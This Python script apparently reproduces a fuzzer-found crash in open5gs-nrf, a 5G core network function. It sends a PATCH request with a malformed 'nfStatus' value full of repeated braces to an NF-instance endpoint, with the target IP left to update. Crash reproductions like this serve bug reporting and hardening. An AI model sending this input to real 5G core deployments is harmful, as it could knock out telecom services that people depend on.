#!/usr/bin/env python3
# Crash reproduction for open5gs-nrf (info)
# Detected: Sat May  9 00:43:05 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PATCH'
path = '/nnrf-nfm/v1/nf-instances/AMF-fuzz-0018'
body = b'{"nfStatus": "REGISTERED{{{{{{{{{{{{{{{{{{{{", "load": 50, "capacity": 200}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
